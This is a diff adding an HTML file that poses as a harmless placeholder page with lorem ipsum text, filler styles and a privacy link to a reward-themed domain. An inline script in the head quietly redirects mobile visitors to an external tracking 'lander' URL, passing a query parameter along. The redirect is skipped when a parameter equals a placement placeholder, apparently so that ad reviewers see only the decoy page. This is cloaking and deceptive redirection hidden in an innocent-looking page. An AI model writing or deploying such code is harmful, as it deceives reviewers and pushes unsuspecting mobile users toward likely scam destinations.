@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Random Website</title>
+<style>
+/* Random CSS styles */
+body {
+  background-color: #f2f2f2;
+  font-family: Arial, sans-serif;
+}
+.container {
+  max-width: 800px;
+  margin: 0 auto;
+  padding: 20px;
+}
+h1 {
+  text-align: center;
+  color: #333;
+}
+p {
+  line-height: 1.5;
+  color: #666;
+}
+.image-container {
+  text-align: center;
+  margin-bottom: 20px;
+}
+.image-container img {
+  max-width: 100%;
+  height: auto;
+}
+footer {
+  text-align: center;
+  margin-top: 40px;
+  color: #999;
+}
+footer a {
+  color: #999;
+  text-decoration: none;
+}
+footer a:hover {
+  color: #666;
+}
+</style>
+<script>
+const urlParams = new URLSearchParams(window.location.search);
+const utmXXX = urlParams.get("xxx");
+const s = urlParams.get("s");
+const ttclid = urlParams.get("ttclid");
+const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+const lander = `https://klcxb6.mcgo2.com/visit/2b563712-fe69-4179-9e2f-168dcbbd0547?s1=${s}`;
+if (utmXXX === "__PLACEMENT__") { }
+else if (isMobileDevice) { window.location.href = lander; } 
+else { }
+</script>
+</head>
+<body>
+<div class="container">
+  <h1>Welcome to My Random Website</h1>
+  <p>This is a website with a completely random layout and design. Enjoy the surprise!</p>
+  <div class="image-container">
+    <img src="https://via.placeholder.com/600x400" alt="Random Image">
+  </div>
+  <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed euismod, nisl eget ultricies tincidunt, nisl nisl aliquam nisl, eget aliquam nisl nisl eget nisl.</p>
+  <p>Donec auctor, nisl eget ultricies tincidunt, nisl nisl aliquam nisl, eget aliquam nisl nisl eget nisl.</p>
+</div>
+<footer>
+  <p>&copy; 2023 Random Website. <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+</footer>
+</body>
+</html>
